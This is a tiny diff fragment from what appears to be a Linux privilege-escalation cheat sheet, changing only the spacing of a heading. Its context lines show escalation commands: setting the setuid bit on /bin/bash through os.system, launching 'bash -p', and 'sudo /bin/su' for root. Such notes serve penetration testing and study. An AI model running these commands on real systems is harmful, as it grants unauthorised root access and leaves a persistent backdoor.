@@ -267,7 +267,7 @@ os.system("chmod +s /bin/bash")
 /bin/bash -p
 ````````````````````````````
 
-#17. /bin/su
+# 17. /bin/su
  root acess
 ``````````````
 sudo /bin/su
